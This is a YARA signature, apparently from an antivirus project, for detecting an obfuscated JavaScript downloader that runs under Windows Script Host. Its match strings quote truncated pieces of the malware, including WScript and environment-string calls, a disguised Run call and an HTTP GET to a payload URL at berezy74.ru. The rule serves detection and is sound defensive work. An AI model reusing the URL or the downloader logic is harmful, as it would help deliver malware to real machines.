rule sig_20160428_6b8c878a6b94750f524ca684f6379998 {
  meta:
    description = "datamaliciousorder - file 20160428_6b8c878a6b94750f524ca684f6379998.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f0eb2410948e38f7986b31cb5095dfd979e7217858271464c3ea4e8cb33a6c3d"

  strings:
    $s1  = "function GphPzjWcpAdkClmTmvPes(XliOhgLyiGeoLiqJtfWzj){KnpGlkIhlMnvDtiCyeSll[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function WznKnsLbgBwlLhoPgaEoa() {return KnpGlkIhlMnvDtiCyeSll[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function GphPzjWcpAdkClmTmvPes(XliOhgLyiGeoLiqJtfWzj){KnpGlkIhlMnvDtiCyeSll[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return CthJcsSyaHieLqkRznDvc - TgeQmwFgsIvvPtsIbiXec;};" fullword ascii
    $s5  = "var KnpGlkIhlMnvDtiCyeSll = function AoqSqfVpwXwrGgiDfcBwt() {return WvhTurEssBxkPouLwaNfq[NrkNojHejFnbQboGzoQcc](\"WScript\"+\"" ascii
    $s6  = "function RudHqdVntWeaFxyFcwJiy(CthJcsSyaHieLqkRznDvc, TgeQmwFgsIvvPtsIbiXec){RqlDcrWanPslFgoQohJmx = RqlDcrWanPslFgoQohJmx * 1; " ascii
    $s7  = "WawXxcLgbJdbFiuBkbTth[GcdTmlNihAozMutAbhClz](\"G\" + \"ET\", \"http://berezy74.ru/n8sjad\", false);" fullword ascii
    $s8  = "var WvhTurEssBxkPouLwaNfq = this[\"WScript\"];" fullword ascii
    $s9  = "var KnpGlkIhlMnvDtiCyeSll = function AoqSqfVpwXwrGgiDfcBwt() {return WvhTurEssBxkPouLwaNfq[NrkNojHejFnbQboGzoQcc](\"WScript\"+\"" ascii
    $s10 = "function WznKnsLbgBwlLhoPgaEoa() {return KnpGlkIhlMnvDtiCyeSll[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function RudHqdVntWeaFxyFcwJiy(CthJcsSyaHieLqkRznDvc, TgeQmwFgsIvvPtsIbiXec){RqlDcrWanPslFgoQohJmx = RqlDcrWanPslFgoQohJmx * 1; " ascii
    $s12 = "function QuzYwlQsyMhvIatDchGyf(){return LljFkqPtrVnqOphIzbHar + \"\";};" fullword ascii
    $s13 = "if (WawXxcLgbJdbFiuBkbTth[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "return RudHqdVntWeaFxyFcwJiy(1 == 1 ? LanIjeImfSizXdyObtFta : 0, 1 == 1 ? YztOobLtlUtmOdpTsbXwb : 0);" fullword ascii
    $s15 = "function BllUufTghNsxGnuMleDxj()" fullword ascii
    $s16 = "}while (GbePlyDmvWgkUrsJwrZwq);" fullword ascii
    $s17 = "function NraQitOvwNkvVjyFflGls(AhyAgmTkcIohFexRoxOfj) {var VgxVxxHbiIjeLdoQqrFgr = (1, 2, 3, 4, 5, AhyAgmTkcIohFexRoxOfj); retur" ascii
    $s18 = "function NraQitOvwNkvVjyFflGls(AhyAgmTkcIohFexRoxOfj) {var VgxVxxHbiIjeLdoQqrFgr = (1, 2, 3, 4, 5, AhyAgmTkcIohFexRoxOfj); retur" ascii
    $s19 = "FggRklRqgNbyNvzJcqWor = true;" fullword ascii
    $s20 = "var FggRklRqgNbyNvzJcqWor = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}